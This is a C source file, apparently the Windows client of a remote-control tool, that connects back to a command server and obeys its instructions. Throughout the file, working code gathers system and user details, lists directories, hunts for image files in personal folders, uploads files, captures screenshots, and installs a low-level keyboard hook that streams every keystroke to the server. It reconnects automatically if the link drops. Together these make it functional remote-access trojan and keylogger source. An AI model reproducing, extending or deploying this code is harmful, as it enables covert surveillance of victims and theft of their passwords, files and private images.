/*
 * win_client.c — Windows 被控端
 * 连接到 socket_server.c，接收并执行命令
 * 编译: gcc win_client.c -o win_client.exe -lws2_32 -lgdi32
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include "include/common.h"

#pragma comment(lib, "ws2_32.lib")

static SOCKET g_sock = INVALID_SOCKET;

/* ── 1. 系统信息 ──────────────────────────────────────── */
static void handle_sysinfo(int sock) {
    char buf[BUFFER_SIZE];
    int len = 0;
    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    // 计算机名
    char hostname[256] = {0};
    DWORD hsz = sizeof(hostname);
    GetComputerNameA(hostname, &hsz);
    len += snprintf(buf + len, sizeof(buf) - len, "主机名: %s\n", hostname);

    // 用户名
    char username[256] = {0};
    DWORD usz = sizeof(username);
    GetUserNameA(username, &usz);
    len += snprintf(buf + len, sizeof(buf) - len, "用户名: %s\n", username);

    // Windows 版本
    OSVERSIONINFOEXA osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    // 用 RtlGetVersion 绕过版本兼容层
    typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (RtlGetVersion) {
        RTL_OSVERSIONINFOW rovi = {0};
        rovi.dwOSVersionInfoSize = sizeof(rovi);
        RtlGetVersion(&rovi);
        len += snprintf(buf + len, sizeof(buf) - len,
                        "系统: Windows %lu.%lu Build %lu\n",
                        rovi.dwMajorVersion, rovi.dwMinorVersion, rovi.dwBuildNumber);
    }

    // 内存
    MEMORYSTATUSEX ms = {0};
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    len += snprintf(buf + len, sizeof(buf) - len,
                    "内存总量: %llu MB\n", ms.ullTotalPhys / 1024 / 1024);
    len += snprintf(buf + len, sizeof(buf) - len,
                    "内存可用: %llu MB\n", ms.ullAvailPhys / 1024 / 1024);

    // CPU
    SYSTEM_INFO si = {0};
    GetSystemInfo(&si);
    len += snprintf(buf + len, sizeof(buf) - len,
                    "CPU核心: %lu\n", si.dwNumberOfProcessors);

    // 磁盘
    ULARGE_INTEGER free_bytes, total_bytes;
    if (GetDiskFreeSpaceExA("C:\\", &free_bytes, &total_bytes, NULL)) {
        len += snprintf(buf + len, sizeof(buf) - len,
                        "磁盘C: 总计=%llu GB  可用=%llu GB\n",
                        total_bytes.QuadPart / 1024 / 1024 / 1024,
                        free_bytes.QuadPart  / 1024 / 1024 / 1024);
    }

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 2. 目录列表 ──────────────────────────────────────── */
static void handle_listdir(int sock, const char *path) {
    char buf[BUFFER_SIZE];
    int len = 0;

    char search[MAX_PATH_LEN];
    snprintf(search, sizeof(search), "%s\\*", path);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(buf, sizeof(buf), "ERR:无法打开目录: %s", path);
        send(sock, buf, (int)strlen(buf), 0);
        return;
    }

    len += snprintf(buf + len, sizeof(buf) - len, "OK:");
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0)
            continue;
        char type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? 'd' : 'f';
        ULONGLONG size = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
        len += snprintf(buf + len, sizeof(buf) - len,
                        "[%c] %-40s %llu bytes\n", type, fd.cFileName, size);
    } while (FindNextFileA(hFind, &fd) && len < BUFFER_SIZE - 256);
    FindClose(hFind);

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 3. 图库列表（扫描图片）─────────────────────────── */
static void scan_images(const char *dir, char *buf, int *len, int max) {
    char search[MAX_PATH_LEN];
    snprintf(search, sizeof(search), "%s\\*", dir);

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        if (fd.cFileName[0] == '.') continue;
        char full[MAX_PATH_LEN];
        snprintf(full, sizeof(full), "%s\\%s", dir, fd.cFileName);

        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_images(full, buf, len, max);
        } else {
            const char *ext = strrchr(fd.cFileName, '.');
            if (ext && (*len < max - 512) &&
                (_stricmp(ext, ".jpg") == 0 || _stricmp(ext, ".jpeg") == 0 ||
                 _stricmp(ext, ".png") == 0 || _stricmp(ext, ".bmp") == 0  ||
                 _stricmp(ext, ".gif") == 0 || _stricmp(ext, ".webp") == 0)) {
                ULONGLONG size = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                *len += snprintf(buf + *len, max - *len,
                                 "%s  [%llu KB]\n", full, size / 1024);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

static void handle_gallery(int sock) {
    char buf[BUFFER_SIZE];
    int len = 0;
    len += snprintf(buf + len, sizeof(buf) - len, "OK:");

    // 常见图片目录
    const char *paths[] = { NULL, NULL, NULL, NULL };
    char pictures[MAX_PATH], desktop[MAX_PATH], downloads[MAX_PATH];

    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYPICTURES, NULL, 0, pictures)))
        paths[0] = pictures;
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktop)))
        paths[1] = desktop;
    // Downloads 没有 CSIDL，手动拼
    char *userprofile = getenv("USERPROFILE");
    if (userprofile) {
        snprintf(downloads, sizeof(downloads), "%s\\Downloads", userprofile);
        paths[2] = downloads;
    }

    for (int i = 0; i < 4 && paths[i]; i++) {
        len += snprintf(buf + len, sizeof(buf) - len, "\n=== %s ===\n", paths[i]);
        scan_images(paths[i], buf, &len, sizeof(buf) - 64);
    }

    len += snprintf(buf + len, sizeof(buf) - len, "\nEND\n");
    send(sock, buf, len, 0);
}

/* ── 4. 获取文件 ──────────────────────────────────────── */
static void handle_getfile(int sock, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "ERR:文件不存在: %s", path);
        send(sock, err, (int)strlen(err), 0);
        return;
    }
    LARGE_INTEGER fsize;
    GetFileSizeEx(hFile, &fsize);
    if (fsize.QuadPart > 10 * 1024 * 1024) {
        char err[64];
        snprintf(err, sizeof(err), "ERR:文件过大 (%lld bytes)", fsize.QuadPart);
        send(sock, err, (int)strlen(err), 0);
        CloseHandle(hFile);
        return;
    }
    char header[64];
    int hlen = snprintf(header, sizeof(header), "DATA:%lld\n", fsize.QuadPart);
    send(sock, header, hlen, 0);

    char chunk[4096];
    DWORD n;
    while (ReadFile(hFile, chunk, sizeof(chunk), &n, NULL) && n > 0)
        send(sock, chunk, (int)n, 0);
    CloseHandle(hFile);
}

/* ── 5. 截屏 ──────────────────────────────────────────── */
static void handle_screenshot(int sock) {
    // 截取全屏，保存为 BMP，再发送
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hScreen = GetDC(NULL);
    HDC hDC     = CreateCompatibleDC(hScreen);
    HBITMAP hBmp = CreateCompatibleBitmap(hScreen, w, h);
    SelectObject(hDC, hBmp);
    BitBlt(hDC, 0, 0, w, h, hScreen, 0, 0, SRCCOPY);

    // 保存到临时文件
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    strncat(tmp, "screen.bmp", MAX_PATH - strlen(tmp) - 1);

    BITMAPFILEHEADER bfh = {0};
    BITMAPINFOHEADER bih = {0};
    bih.biSize        = sizeof(BITMAPINFOHEADER);
    bih.biWidth       = w;
    bih.biHeight      = -h; // 正向
    bih.biPlanes      = 1;
    bih.biBitCount    = 24;
    bih.biCompression = BI_RGB;
    int row_size      = ((w * 3 + 3) & ~3);
    bih.biSizeImage   = row_size * h;

    bfh.bfType      = 0x4D42;
    bfh.bfOffBits   = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    bfh.bfSize      = bfh.bfOffBits + bih.biSizeImage;

    BYTE *pixels = (BYTE *)malloc(bih.biSizeImage);
    GetDIBits(hDC, hBmp, 0, h, pixels, (BITMAPINFO *)&bih, DIB_RGB_COLORS);

    FILE *f = fopen(tmp, "wb");
    if (f) {
        fwrite(&bfh, sizeof(bfh), 1, f);
        fwrite(&bih, sizeof(bih), 1, f);
        fwrite(pixels, 1, bih.biSizeImage, f);
        fclose(f);
    }
    free(pixels);
    DeleteObject(hBmp);
    DeleteDC(hDC);
    ReleaseDC(NULL, hScreen);

    // 发送文件
    handle_getfile(sock, tmp);
    DeleteFileA(tmp);
}

/* ── 6. 键盘监听 ──────────────────────────────────────── */
static volatile int g_keylog = 0;
static HHOOK g_hook = NULL;
static SOCKET g_keylog_sock = INVALID_SOCKET;

static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wp, LPARAM lp) {
    if (nCode == HC_ACTION && wp == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lp;
        char key[64] = {0};
        // 转换虚拟键码为字符串
        BYTE state[256] = {0};
        GetKeyboardState(state);
        WCHAR wch[4] = {0};
        int r = ToUnicode(kb->vkCode, kb->scanCode, state, wch, 4, 0);
        if (r == 1 && wch[0] >= 32) {
            // 可打印字符
            WideCharToMultiByte(CP_UTF8, 0, wch, 1, key, sizeof(key), NULL, NULL);
        } else {
            // 特殊键
            switch (kb->vkCode) {
            case VK_RETURN:  strcpy(key, "[ENTER]"); break;
            case VK_BACK:    strcpy(key, "[BS]");    break;
            case VK_SPACE:   strcpy(key, " ");       break;
            case VK_TAB:     strcpy(key, "[TAB]");   break;
            case VK_SHIFT:   strcpy(key, "[SHIFT]"); break;
            case VK_CONTROL: strcpy(key, "[CTRL]");  break;
            case VK_MENU:    strcpy(key, "[ALT]");   break;
            case VK_DELETE:  strcpy(key, "[DEL]");   break;
            default: snprintf(key, sizeof(key), "[VK:%d]", kb->vkCode);
            }
        }
        if (g_keylog_sock != INVALID_SOCKET) {
            char msg[128];
            int mlen = snprintf(msg, sizeof(msg), "KEYEVENT:%s\n", key);
            send(g_keylog_sock, msg, mlen, 0);
        }
    }
    return CallNextHookEx(g_hook, nCode, wp, lp);
}

static DWORD WINAPI keylog_msg_loop(LPVOID param) {
    g_hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    MSG msg;
    while (g_keylog && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    if (g_hook) { UnhookWindowsHookEx(g_hook); g_hook = NULL; }
    return 0;
}

static HANDLE g_keylog_thread = NULL;

static void handle_keylog_start(int sock) {
    if (g_keylog) return;
    g_keylog      = 1;
    g_keylog_sock = sock;
    g_keylog_thread = CreateThread(NULL, 0, keylog_msg_loop, NULL, 0, NULL);
    send(sock, "OK:键盘监听已启动\n", 20, 0);
}

static void handle_keylog_stop(int sock) {
    g_keylog = 0;
    if (g_keylog_thread) {
        PostThreadMessage(GetThreadId(g_keylog_thread), WM_QUIT, 0, 0);
        WaitForSingleObject(g_keylog_thread, 2000);
        CloseHandle(g_keylog_thread);
        g_keylog_thread = NULL;
    }
    g_keylog_sock = INVALID_SOCKET;    send(sock, "OK:键盘监听已停止\n", 20, 0);
}

/* ── 主命令循环 ───────────────────────────────────────── */
static void run_loop(int sock) {
    char buf[BUFFER_SIZE];
    printf("[+] 已连接，等待命令...\n");

    while (1) {
        memset(buf, 0, sizeof(buf));
        int n = recv(sock, buf, sizeof(buf) - 1, 0);
        if (n <= 0) { printf("[*] 连接断开\n"); break; }
        buf[n] = '\0';
        printf("[CMD] %s\n", buf);

        if (strcmp(buf, CMD_SYSINFO) == 0) {
            handle_sysinfo(sock);
        } else if (strncmp(buf, CMD_LISTDIR, strlen(CMD_LISTDIR)) == 0) {
            handle_listdir(sock, buf + strlen(CMD_LISTDIR));
        } else if (strcmp(buf, CMD_GALLERY) == 0) {
            handle_gallery(sock);
        } else if (strncmp(buf, CMD_GETFILE, strlen(CMD_GETFILE)) == 0) {
            handle_getfile(sock, buf + strlen(CMD_GETFILE));
        } else if (strcmp(buf, CMD_SCREENSHOT) == 0) {
            handle_screenshot(sock);
        } else if (strcmp(buf, CMD_KEYLOG_START) == 0) {
            handle_keylog_start(sock);
        } else if (strcmp(buf, CMD_KEYLOG_STOP) == 0) {
            handle_keylog_stop(sock);
        } else if (strcmp(buf, CMD_EXIT) == 0) {
            printf("[*] 收到退出指令\n");
            break;
        }
    }
}

/* ── main ─────────────────────────────────────────────── */
int main(int argc, char *argv[]) {
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);

    const char *server_ip = argc > 1 ? argv[1] : "127.0.0.1";
    int         port      = argc > 2 ? atoi(argv[2]) : PORT_WINDOWS;

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);

    while (1) { // 断线自动重连
        SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in addr = {0};
        addr.sin_family = AF_INET;
        addr.sin_port   = htons((u_short)port);
        inet_pton(AF_INET, server_ip, &addr.sin_addr);

        printf("[*] 连接到 %s:%d ...\n", server_ip, port);
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
            g_sock = sock;
            run_loop(sock);
        } else {
            printf("[!] 连接失败，5秒后重试...\n");
        }
        closesocket(sock);
        g_sock = INVALID_SOCKET;        Sleep(5000);
    }

    WSACleanup();
    return 0;
}
